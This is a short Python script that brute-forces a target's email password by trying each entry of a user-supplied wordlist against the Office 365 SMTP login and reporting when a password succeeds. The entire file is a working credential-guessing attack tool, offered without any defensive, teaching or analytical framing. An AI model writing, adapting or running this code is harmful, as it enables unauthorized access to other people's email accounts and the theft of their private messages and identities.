import smtplib

smtpserver = smtplib.SMTP("smtp.office365.com",587)
smtpserver.ehlo()
smtpserver.starttls()

email = raw_input("Enter Email Target: ")
print("+++++++++++++++++++++++++++++++++++++++++")
passwfile = raw_input("Enter Wordlist File: ")
passwfile = open(passwfile,"r")

for password in passwfile:
    try:
        smtpserver.login(email,password)
        print("[+] PASS FOUND =======> %s ") % password
        break;
    except smtplib.SMTPAuthenticationError:
        print("[!] PASS INCORRECT =======> %s ") % password
